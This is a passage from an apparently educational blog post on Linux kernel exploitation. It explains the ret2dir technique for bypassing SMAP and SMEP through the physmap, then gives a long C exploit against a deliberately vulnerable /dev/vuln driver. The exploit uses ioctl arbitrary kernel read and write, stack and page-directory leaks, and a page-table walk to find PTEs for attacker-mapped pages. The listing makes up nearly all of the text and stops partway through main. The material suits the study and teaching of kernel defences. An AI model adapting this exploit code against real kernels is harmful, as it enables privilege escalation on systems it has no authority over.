One way to bypass these systems is through <strong>ret2dir</strong>, where the attacker allocates large amounts of memory in userland, forcing the kernel to map these pages into the <strong>physmap</strong>. Since the physmap is shared between userland and kernel, attacker-controlled data can reside at known kernel addresses. The attacker allocates multiple pages in userland via <code>mmap</code> and fills them with malicious code (shellcode). This is useful because SMAP and SMEP do not block execution in the physmap. Below is an example code for this purpose:</p>
<p><img alt="ret2dir" src="https://figures.semanticscholar.org/1de5ae8534fc76323e4d926e10dc0fc76a28a361/5-Figure2-1.png"></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
<label for="tab-1-0" class="tab-label">ret2dir.c</label>
<div class="tab-content tab-content-1-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;sys/fcntl.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;sys/mman.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;sys/stat.h&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>#define VULN_READ 0x1111
</span></span><span style="display:flex;"><span>#define VULN_WRITE 0x2222
</span></span><span style="display:flex;"><span>#define VULN_STACK 0x3333
</span></span><span style="display:flex;"><span>#define VULN_PGD 0x4444
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">struct</span> rwRequest {
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>kaddr;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>uaddr;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">size_t</span> length;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> pageOffsetBase <span style="color:#ec0000">=</span> <span style="color:#008900">0xffff888000000000</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">Open</span>(<span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>fname, <span style="color:#5f5fff">int</span> mode) {
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">int</span> fd;
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> ((fd <span style="color:#ec0000">=</span> <span style="color:#5f5fff">open</span>(fname, mode)) <span style="color:#ec0000">&lt;</span> <span style="color:#008900">0</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;open&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> fd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">void</span> <span style="color:#5f5fff">write64</span>(<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> kaddr, <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> value) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">struct</span> rwRequest req;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> value_ <span style="color:#ec0000">=</span> value;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	req.uaddr <span style="color:#ec0000">=</span> <span style="color:#ec0000">&amp;</span>value_;
</span></span><span style="display:flex;"><span>	req.length <span style="color:#ec0000">=</span> <span style="color:#008900">8</span>;
</span></span><span style="display:flex;"><span>	req.kaddr <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)kaddr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">int</span> fd <span style="color:#ec0000">=</span> <span style="color:#5f5fff">Open</span>(<span style="color:#008900">&#34;/dev/vuln&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#5f5fff">ioctl</span>(fd, VULN_WRITE, <span style="color:#ec0000">&amp;</span>req) <span style="color:#ec0000">&lt;</span> <span style="color:#008900">0</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;ioctl&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">read64</span>(<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> kaddr) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">struct</span> rwRequest req;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> value;;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	req.uaddr <span style="color:#ec0000">=</span> <span style="color:#ec0000">&amp;</span>value;
</span></span><span style="display:flex;"><span>	req.length <span style="color:#ec0000">=</span> <span style="color:#008900">8</span>;
</span></span><span style="display:flex;"><span>	req.kaddr <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)kaddr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">int</span> fd <span style="color:#ec0000">=</span> <span style="color:#5f5fff">Open</span>(<span style="color:#008900">&#34;/dev/vuln&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#5f5fff">ioctl</span>(fd, VULN_READ, <span style="color:#ec0000">&amp;</span>req) <span style="color:#ec0000">&lt;</span> <span style="color:#008900">0</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;ioctl&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> value;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">leak_stack</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">struct</span> rwRequest req;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> stack;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">int</span> fd <span style="color:#ec0000">=</span> <span style="color:#5f5fff">Open</span>(<span style="color:#008900">&#34;/dev/vuln&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	req.uaddr <span style="color:#ec0000">=</span> <span style="color:#ec0000">&amp;</span>stack;
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#5f5fff">ioctl</span>(fd, VULN_STACK, <span style="color:#ec0000">&amp;</span>req) <span style="color:#ec0000">&lt;</span> <span style="color:#008900">0</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;ioctl&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> stack;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">leak_pgd</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">struct</span> rwRequest req;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> pgd <span style="color:#ec0000">=</span> <span style="color:#008900">0xcccccccc</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">int</span> fd <span style="color:#ec0000">=</span> <span style="color:#5f5fff">Open</span>(<span style="color:#008900">&#34;/dev/vuln&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	req.uaddr <span style="color:#ec0000">=</span> <span style="color:#ec0000">&amp;</span>pgd;
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#5f5fff">ioctl</span>(fd, VULN_PGD, <span style="color:#ec0000">&amp;</span>req) <span style="color:#ec0000">&lt;</span> <span style="color:#008900">0</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;ioctl&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> pgd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">find_synonym</span>(<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> pgdir, <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> vaddr) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index1 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">39</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index2 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">30</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index3 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">21</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index4 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;index1: %lx, index2: %lx, index3: %lx index4: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, index1, index2, index3, index4);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv1 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>(pgdir <span style="color:#ec0000">+</span> index1<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv1) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv1 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv1: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv1);
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv2 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>((((lv1 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index2<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv2) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv2 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv2: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv2);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv3 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>((((lv2 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index3<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv3) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv3 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv3: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv3);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv4 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>((((lv3 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index4<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv4) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv3 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv4: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv4);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> vaddr_alias <span style="color:#ec0000">=</span> (((lv4 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase;
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> vaddr_alias;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">pageTableWalk</span>(<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> pgdir, <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> vaddr) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index1 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">39</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index2 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">30</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index3 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">21</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> index4 <span style="color:#ec0000">=</span> (vaddr <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x1ff</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;index1: %lx, index2: %lx, index3: %lx index4: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, index1, index2, index3, index4);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv1 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>(pgdir <span style="color:#ec0000">+</span> index1<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv1) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv1 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv1: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv1);
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv2 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>((((lv1 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index2<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv2) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv2 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv2: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv2);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv3 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>((((lv2 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index3<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv3) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv3 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv3: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv3);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> lv4 <span style="color:#ec0000">=</span> <span style="color:#5f5fff">read64</span>((((lv3 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index4<span style="color:#ec0000">*</span><span style="color:#008900">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>lv4) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[!] lv3 is invalid</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;lv4: %lx</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, lv4);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> vaddr_alias <span style="color:#ec0000">=</span> (((lv4 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;vaddr alias page: %p</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, (<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)vaddr_alias);
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> pte_addr <span style="color:#ec0000">=</span> (((lv3 <span style="color:#ec0000">&gt;&gt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">&amp;</span> <span style="color:#008900">0x3fffffff</span>) <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">12</span>) <span style="color:#ec0000">+</span> pageOffsetBase <span style="color:#ec0000">+</span> index4<span style="color:#ec0000">*</span><span style="color:#008900">8</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;pte address: %p</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, (<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)pte_addr);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">return</span> pte_addr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span> (<span style="color:#5f5fff">int</span> argc, <span style="color:#5f5fff">char</span> <span style="color:#ec0000">**</span>argv){
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>rwx <span style="color:#ec0000">=</span> <span style="color:#5f5fff">mmap</span>(<span style="color:#ec0000">NULL</span>, <span style="color:#008900">0x1000</span>, PROT_READ<span style="color:#ec0000">|</span>PROT_WRITE<span style="color:#ec0000">|</span>PROT_EXEC, MAP_ANONYMOUS<span style="color:#ec0000">|</span>MAP_PRIVATE, <span style="color:#ec0000">-</span><span style="color:#008900">1</span>, <span style="color:#008900">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (rwx <span style="color:#ec0000">==</span> MAP_FAILED) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;mmap&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>rw <span style="color:#ec0000">=</span> <span style="color:#5f5fff">mmap</span>(<span style="color:#ec0000">NULL</span>, <span style="color:#008900">0x1000</span>, PROT_READ<span style="color:#ec0000">|</span>PROT_WRITE, MAP_ANONYMOUS<span style="color:#ec0000">|</span>MAP_PRIVATE, <span style="color:#ec0000">-</span><span style="color:#008900">1</span>, <span style="color:#008900">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ec0000">if</span> (rw <span style="color:#ec0000">==</span> MAP_FAILED) {
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;mmap&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#5f5fff">exit</span>(<span style="color:#ec0000">-</span><span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">memset</span>(rwx, <span style="color:#008900">0xcc</span>, <span style="color:#008900">0x1000</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">memset</span>(rw, <span style="color:#008900">0xcc</span>, <span style="color:#008900">0x1000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> pgd <span style="color:#ec0000">=</span> <span style="color:#5f5fff">leak_pgd</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[*] page directory is at: %p</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, (<span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>)pgd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> rwx_pte <span style="color:#ec0000">=</span> <span style="color:#5f5fff">pageTableWalk</span>(pgd, <span style="color:#5f5fff">find_synonym</span>(pgd,rwx));
</span></span><span style="display:flex;"><span>	<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> rw_pte <span style="color:#ec0000">=</span> <span style="color:#5f5fff">pageTableWalk</span>(pgd, <span style="color:#5f5fff">find_synonym</span>(pgd,rw));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
